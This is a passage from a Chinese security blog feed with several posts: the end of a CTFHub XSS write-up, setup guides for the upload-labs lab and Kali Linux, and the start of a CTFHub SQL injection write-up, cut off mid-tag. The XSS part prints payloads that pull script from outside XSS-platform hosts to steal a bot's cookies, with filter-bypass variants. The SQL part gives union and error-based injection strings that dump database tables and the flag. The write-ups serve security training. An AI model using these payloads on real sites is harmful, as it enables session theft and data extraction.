src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022046400.png" alt="Image 19"></p><p>我们在第二个表单中发送payload给后台的bot让其遭受xss攻击（模拟管理员点击了恶意xss链接盗取cookie）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022046611.png" alt="Image 20"></p><p>Ok了，xss链接生效了，靶机上线</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047574.png" alt="Image 21"></p><p>我们查看返回的xss数据，在cookie中发现flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047949.png" alt="Image 22"></p><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>还是两个表单，一个尝试，一个bot</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047207.png" alt="Image 23"></p><p>和上题一样，先测试一下XSS漏洞</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047402.png" alt="Image 24"></p><p>这次是POST传参</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047906.png" alt="Image 25"></p><p>传递的内容是URL编码后的payload</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047742.png" alt="Image 26"></p><p>在第一个表单里写一下在线平台的payload（其实只尝试是否弹窗就可以了）</p><p>注意：在第一个框试验在线平台的payload会导致我们自己的主机上线，但我们的主机没有flag，找flag时不要找错了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047181.png" alt="Image 27"></p><p>这里的“会话过期”是我的在线xss平台设计的弹窗，目的是诱导用户重新登陆，从而控制用户账号。但实际上没啥用，仅仅有弹窗的效果，相当于alert(“此会话已过期，您需要重新登陆”)，这里暂时忽略。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047375.png" alt="Image 28"></p><p>右键查看源代码，看看xss是怎么形成的</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047614.png" alt="Image 29"></p><p>第一个框上传后，再将当前url粘贴到第二个框中发给bot，这样就把有我们payload的页面发给bot（存储型与反射型区别就在于此），从而上线主机</p><p>还是cookie里有flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047733.png" alt="Image 30"></p><h2 id="DOM反射"><a href="#DOM反射" class="headerlink" title="DOM反射"></a>DOM反射</h2><p>直接输入payload竟然没弹窗，看看源代码，原来是没有去闭合语句</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047634.png" alt="Image 31"></p><p>这里我们要去闭合语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">sCRiPt</span> <span class="hljs-attr">sRC</span>=<span class="hljs-string">//xs.pe/FVQ</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">sCrIpT</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047386.png" alt="Image 32"></p><p>成功弹窗</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047516.png" alt="Image 33"></p><p>看一下源代码，完美闭合</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047621.png" alt="Image 34"></p><p>还是发给bot，看cookie</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047804.png" alt="Image 35"></p><h2 id="DOM跳转"><a href="#DOM跳转" class="headerlink" title="DOM跳转"></a>DOM跳转</h2><p>一进来看见Submit不好使了，还以为有前端过滤</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047422.png" alt="Image 36"></p><p>捣鼓一顿，发现就算Submit可以提交了也没啥用</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047902.png" alt="Image 37"></p><p>遂观察源代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047072.png" alt="Image 38"></p><p>以下是上面JavaScript代码的分步解释：</p><p>1、<code>location.search</code>获取当前URL中?号开始的查询字符串部分</p><p>例如：URL为<code>http://example.com?jumpto=news.html</code>时，location.search 返回<code> ?jumpto=news.html</code></p><p>2、<code>split(&quot;=&quot;)</code> 用等号分割查询字符串</p><p>上述例子会被分割为数组：<code>[&quot;?jumpto&quot;, &quot;news.html&quot;]</code></p><p>3、<code>target[0].slice(1)</code> 处理第一个参数</p><p><code>target[0]</code> 是 <code>&quot;?jumpto&quot;.slice(1)</code> 去掉第一个字符问号，得到 <code>&quot;jumpto&quot;</code></p><p>4、判断 <code>if (target[0].slice(1) == &quot;jumpto&quot;)</code></p><p>验证第一个参数名是否为jumpto</p><p>5、<code>location.href = target[1]</code> 执行跳转</p><p>当条件满足时，页面会自动跳转到target[1]指定的地址</p><p>简单来说，这段代码的作用是从当前页面的URL中获取查询字符串（URL的get参数），如果参数名为”jumpto”，则将页面重定向到参数值所指定的URL。</p><p>而当我们传递类似于&#96;jumpto&#x3D;javascript:alert(1)这样的代码时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它。</p><p>验证一下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047393.png" alt="Image 39"></p><p>成功弹窗</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047707.png" alt="Image 40"></p><p>然后构造链接来加载xss平台的代码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?j</span>umpto=<span class="hljs-symbol">javascript:</span><span class="hljs-variable">$.</span>getScript(<span class="hljs-string">&quot;//uj.ci/a3b&quot;</span>)<br></code></pre></td></tr></table></figure><p>这段代码使用了jQuery的$.getScript()函数来异步加载并执行来自xss平台的js脚本，<strong>使用前提是网站引用了jQuery。</strong></p><p>发给机器人，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022047775.png" alt="Image 41"></p><p>成功获得flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048911.png" alt="Image 42"></p><p>注意：像作者之前使用的TLXSS平台就<strong>不支持jQuery</strong>，从而耗费了很长时间，大家如果做不出来就换一个xss平台（而且不要再换成同类型的平台，这个坑大家一定要注意）</p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>没什么说的，把payload换一下就行</p><p>因为会过滤空格，所以我们用下面的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;sCRiPt/sRC=//xs.pe/FVQ&gt;&lt;/sCrIpT&gt;<br></code></pre></td></tr></table></figure><p>发给bot</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048513.png" alt="Image 43"></p><p>看cookie</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048406.png" alt="Image 44"></p><h2 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h2><p>先尝试一下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048350.png" alt="Image 45"></p><p>直接弹窗了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048376.png" alt="Image 46"></p><p>应该是在线网站的payload有大小写绕过，尝试了一下，下面这句就不会弹窗，应该是过滤了script</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048885.png" alt="Image 47"></p><p>既然在线网站的payload可行，那我们直接发给bot，看cookie，成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048353.png" alt="Image 48"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFHub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs安装与配置</title>
    <link href="/2025/05/04/upload-labs%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <url>/2025/05/04/upload-labs%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/145423743?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/145423743?spm=1001.2014.3001.5501</a></p></blockquote><p>作者进行upload-labs靶场练习时，在环境上出了很多问题，吃了很多苦头，甚至改了很多配置也没有成功。</p><p>upload-labs很多操作都是旧时代的产物了，配置普遍都比较老，比如PHP版本用5.2.17（还有中间件等，全要求使用旧的），如果采用现在的配置，基本很难复现出来。</p><p>但是我们不能因为配置旧、相对过时就不去复现。事实上，因为重写难度较大、花费较多，很多“老家伙”到现在都是用PHP 5.X系列写的。而这些“老家伙”往往容易出问题，某些时候甚至是渗透重点，所以绝不能忽略之前的技术。</p><p>为了防止大家踩坑，也为了节省大家的时间，在这里直接给出简单有效的配置方法。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先我们要访问github上的upload-labs，上面专门准备了一套老的集成环境。</p><p><a href="https://github.com/c0ny1/upload-labs/releases" title="Releases · c0ny1&#x2F;upload-labs · GitHub">Releases · c0ny1&#x2F;upload-labs · GitHub</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021955619.png"></p><p>下载集成环境</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021955419.png"></p><p>在一个<strong>没有中文</strong>的路径解压缩（不要在中文路径下解压缩！！！）</p><p>这里先不要着急打开完整环境。</p><p>先到解压缩的完整环境的所在路径，找到upload-labs所在位置，在upload-labs-env-win-0.1-beta.1\upload-labs-env\WWW下。</p><p>点开后发现只有19关，而最新的有21关。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021955101.png"></p><p>所以我们还要下载最新的21关，这里先把WWW目录下所有文件全删掉</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021955802.png"></p><p>然后我们下载最新的21关</p><p><a href="https://github.com/c0ny1/upload-labs" title="GitHub - c0ny1&#x2F;upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场">GitHub - c0ny1&#x2F;upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场</a></p><p>（这个压缩包就算环境配置好了也不要删，我们第五关的时候要用）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021955035.png"></p><p>然后解压缩，放到WWW文件夹下。</p><p>这里作者把刚刚解压缩文件夹的名字改成upload-labs（别把WWW文件夹名给改了），这样比较直观。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021955893.png"></p><p>接下来<strong>要注意先看”使用说明.txt”。</strong></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956693.png"></p><p>我们需要先运行一下modify_path.bat文件</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956434.png"></p><p>运行之后显示修改完毕。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956133.png"></p><p>然后双击打开phpstudy</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956811.png"></p><p>这是旧版本的phpstudy，和新版本有所不同。</p><p>启动环境</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956099.png"></p><p>启动成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956771.png"></p><p>然后访问locahost下upload-labs文件夹名即可。</p><p>比如作者upload-labs文件夹名字就叫upload-labs，那就访问<a href="http://localhost/upload-labs/" title="http:&#x2F;&#x2F;localhost&#x2F;upload-labs&#x2F;">http://localhost/upload-labs/</a>；如果读者的upload-labs文件夹名字为upload-labs-master，那需要访问<a href="http://localhost/upload-labs-master/" title="http:&#x2F;&#x2F;localhost&#x2F;upload-labs-master&#x2F;">http://localhost/upload-labs-master/</a>。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956179.png">然后可以开始做题了。</p><p>大家可以看一下作者的wp以及总结。</p><p>wp：<a href="https://blog.csdn.net/2302_81178149/article/details/145442006" title="upload-labs通关全详解-CSDN博客">upload-labs通关全详解-CSDN博客</a></p><p>总结：<a href="https://blog.csdn.net/2302_81178149/article/details/145433812" title="文件上传学习总结_文件上传学习 csdn-CSDN博客">文件上传学习总结_文件上传学习 csdn-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali linux下载与安装快捷版</title>
    <link href="/2025/05/04/Kalilinux%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85%E5%BF%AB%E6%8D%B7%E7%89%88/"/>
    <url>/2025/05/04/Kalilinux%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85%E5%BF%AB%E6%8D%B7%E7%89%88/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/145423439?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/145423439?spm=1001.2014.3001.5501</a></p></blockquote><p>关于Kali linux的下载安装，很多文章都是自己创建虚拟机去安装，但这样太过繁琐，本文采用导入虚拟机的方式来实现快捷安装，步骤少、时间短，以减少在环境配置上的时间与精力消耗。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h3><p>首先我们下载镜像，选择在官网下载，</p><p><a href="https://www.kali.org/get-kali/#kali-platforms" title="Get Kali | Kali Linux">Get Kali | Kali Linux</a></p><p>进入官网后有几个Kali下载的选项，</p><p><strong>Install Imagine是自己创建虚拟机去安装：</strong></p><p>Single or multiple boot Kali, giving you complete control over the hardware access (perfect for in-built Wi-Fi and GPU), enabling the best performance.</p><p>（翻译：单启动或多启动 Kali，让您可以完全控制硬件访问（非常适合内置 Wi-Fi 和 GPU），实现最佳性能）。</p><p><strong>Virtual Machines是导入虚拟机的方式来实现快捷安装：</strong></p><p>VMware &amp; VirtualBox pre-built images. Allowing for a Kali install without altering the host OS with additional features such as snapshots. Vagrant images for quick spin-up also available.</p><p>（翻译：VMware &amp; VirtualBox 预构建镜像。允许 Kali 安装，而无需使用快照等附加功能更改主机操作系统。还提供用于快速启动的 Vagrant 图像。）</p><p>其余选项是ARM版和手机端之类的，这里我们忽视就行</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021919229.png"></p><p>我们这里点击Virtual Machines，这里作者用的虚拟化软件是VMware，所以找VMware版本的<strong>镜像包</strong>去下载。</p><p>（VMware现在已经个人免费了，注册一个账户就可以免费使用，具体的下载并不繁琐，和普通阮软件的下载、安装区别不大，可以随便找一个博客参考一下）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021919671.png"></p><p>静待下载，下载完自己找个位置解压缩镜像包**（要记住位置，一会要用）**</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021919284.png"></p><h3 id="导入虚拟机"><a href="#导入虚拟机" class="headerlink" title="导入虚拟机"></a>导入虚拟机</h3><p>打开VMware，左上角点击文件，选择扫描虚拟机选项</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021919510.png"></p><p><strong>选择我们刚才解压的路径后，点击下一步</strong></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920758.png"></p><p><strong>点击完成，虚拟机成功导入</strong></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021919749.png"></p><p><strong>然后关闭扫描虚拟机向导</strong></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021919013.png"></p><p>开启虚拟机</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920103.png"></p><p>静等开机**，默认账户和密码都是kali**</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920914.png"></p><p>登录成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920760.png"></p><h3 id="切换中文"><a href="#切换中文" class="headerlink" title="切换中文"></a>切换中文</h3><p>如果有需要，我们可以把Kali切换成中文的，先打开终端，右击选择Open Terminal Here</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920589.png"></p><p>复制下面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> dpkg-reconfigure locales<br></code></pre></td></tr></table></figure><p>在终端右键，粘贴</p><p>注意别带什么乱七八糟的符号，如果有就删掉</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920303.png"></p><p>然后输入密码，还是kali</p><p>这里输入密码的时候不会显示，输完按Enter即可</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920132.png"></p><p>选择语言，使用空格键选中，首先找到en_US.UTF-8 UTF-8取消选中，再找到zh_CN.UTF-8 UTF-8选中</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920496.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920139.png"></p><p>选中zh_CN.UTF-8为默认语言</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920683.png"></p><p>输入reboot命令，重启kali</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920120.png"></p><p>重新登陆</p><p>然后弹出是否把文件夹名称也更新‘</p><p><strong>这里建议保留旧的名称，用中文路径后续容易出问题，注意勾选不要再次询问</strong></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920981.png"></p><p>如果有需要，可以给kali linux换源，下载、更新会更快一些，网上教程很多，这里就不多说</p><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>我们给kali更新一下（其实我们下载的已经很新了，再更新无非是锦上添花，直接使用也可）</p><p>打开root</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920463.png"></p><p>输入密码：kali</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021920511.png"></p><p>然后逐行输入下面的命令，注意别把中文字符也复制了（注意：不换源的话，需要很长时间，请谨慎执行）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update 更新索引<br> <br>apt-<span class="hljs-built_in">get</span><span class="hljs-built_in"> upgrade </span>更新软件<br> <br>apt-<span class="hljs-built_in">get</span> dist-upgrade 升级<br> <br>apt-<span class="hljs-built_in">get</span> clean 删除缓存包<br> <br>apt-<span class="hljs-built_in">get</span> autoclean 删除未安装的deb包<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入-CTFHub</title>
    <link href="/2025/05/04/SQL%E6%B3%A8%E5%85%A5-CTFHub/"/>
    <url>/2025/05/04/SQL%E6%B3%A8%E5%85%A5-CTFHub/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/145423635?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/145423635?spm=1001.2014.3001.5501</a></p></blockquote><p>在众多的CTF平台当中，CTFHub对于初学者来说，是入门平台的不二之选。CTFHub通过自己独特的技能树模块，可以帮助初学者来快速入门。具体请看官方介绍：<a href="https://www.ctfhub.com/#/index" title="CTFHub">CTFHub</a>。</p><p><strong>作者的CTFHub技能树汇总：</strong></p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142747270?spm=1001.2014.3001.5501" title="CTFHub技能树Web汇总-CSDN博客">CTFHub技能树Web汇总-CSDN博客</a></p><p>关于sql注入，作者认为sqli-labs是一个很好的靶场。作者通过该靶场训练到了sql注入的大多数技巧。应对这些题型时就已经得心应手，推荐大家也做一下。</p><p>sqli_labs的wp：<a href="https://blog.csdn.net/2302_81178149/article/details/142738784?spm=1001.2014.3001.5502" title="sqli-labs通关全详解-CSDN博客">sqli-labs通关全详解-CSDN博客</a></p><p>sql注入的技术总结：<a href="https://blog.csdn.net/2302_81178149/article/details/142738173?spm=1001.2014.3001.5502" title="SQL注入全详解_sql注入csdn-CSDN博客">SQL注入全详解_sql注入csdn-CSDN博客</a></p><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>首页</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925262.png"></p><p>输个1，发现出数据了，一看URL，GET型整数注入，而且还把我们输入的SQL语句也拿出来了，似乎不需要闭合</p><p>持续输入，id只到2，输入3就没返回值了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925664.png"></p><p>输入1’，验证了确实不需要闭合，没有返回数据说明出错了，但没有报错（不能用报错注入）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925862.png"></p><p>那就用联合注入，先看看有几个返回值，</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>union select <span class="hljs-number">0</span>,<span class="hljs-number">1#</span><br></code></pre></td></tr></table></figure><p>逐见增加，当从0加到1时，有回显，确定返回值是两个（有时候返回值多于回显位，不一定每个值都显示）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925112.png"></p><p>接下来确定我们输入的值（即0和1）对应的回显位（注意union前的语句要是错的，前面语句是对的话，就会一直输出1和ctfhub，得不到我们想要的信息）</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925642.png"></p><p>接下来就是常规步骤</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>()#<br></code></pre></td></tr></table></figure><p>这个flag表似乎是我们想要的</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925627.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;flag&#x27;</span>#<br></code></pre></td></tr></table></figure><p>连字段名都是flag，那必然是它了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925880.png"></p><p>出了</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">-<span class="hljs-number">1</span> union <span class="hljs-built_in">select</span> <span class="hljs-number">0</span>,group_concat(<span class="hljs-built_in">flag</span>) <span class="hljs-keyword">from</span> <span class="hljs-built_in">flag</span>#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925008.png"></p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>还是输个1，发现是字符型注入，用单引号闭合</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925234.png"></p><p>确定回显</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925252.png"></p><p>剩下的步骤和上题基本一样</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925693.png"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>输个<code>1</code>，查询正确，没有回显位，不能用报错注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925643.png"></p><p>输个<code>1’</code>，有报错，而且看起来不用闭合，用报错注入试试</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925580.png"></p><p>这里我用了extractvalue()报错，floot()、updatexml()报错都是可以的</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database())))#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021925464.png"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database())))#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926893.png"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(column_name) from information_schema.columns where table_name = <span class="hljs-comment">&#x27;flag&#x27;)))#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926476.png"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(flag) from flag)))#<br></code></pre></td></tr></table></figure><p>发现flag不全</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926163.png"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,substr((select group_concat(flag) from flag),<span class="hljs-number">30</span>,<span class="hljs-number">32</span>)))#<br></code></pre></td></tr></table></figure><p>原来只差个}</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926885.png"></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>输个1</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926916.png"></p><p>1‘，没啥有价值的信息，没有回显也没有报错</p><p><img 